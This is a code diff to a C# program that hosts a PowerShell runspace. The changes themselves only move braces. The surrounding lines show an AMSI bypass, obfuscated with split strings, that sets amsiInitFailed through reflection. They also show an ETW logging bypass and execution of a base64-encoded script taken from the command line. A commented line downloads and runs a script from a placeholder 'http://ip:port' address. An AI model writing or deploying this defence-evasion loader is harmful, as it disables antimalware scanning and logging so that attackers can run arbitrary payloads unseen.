@@ -19,15 +19,13 @@ namespace TestExe
             }
             Runspace mySpace = RunspaceFactory.CreateRunspace();
             mySpace.Open();
-            try
-            {
+            try{
                 mySpace.GetType().Assembly.GetType("Syste" + "m.Managem" + "ent.Autom" + "ation.AmsiU" + "tils").GetField("am" + "siInitF" + "ailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
             }catch{
                 Console.WriteLine("[-] Maybe you needn't bypass.");
             }
 
-            try
-            {
+            try{
                 mySpace.GetType().Assembly.GetType("System.Mana" + "gement.Au" + "tomation.Tr" + "acing.PSEtw" + "LogProvider").GetField("etwPro" + "vider", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid()));
             }catch{
                 Console.WriteLine("[-] Maybe you needn't bypass ETW.");
@@ -35,8 +33,7 @@ namespace TestExe
 
             Pipeline myPipeLine = mySpace.CreatePipeline();
 
-            try
-            {
+            try{
                 myPipeLine.Commands.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String(args[0])));
                 //myPipeLine.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))");
                 Collection<PSObject> outputs = myPipeLine.Invoke();
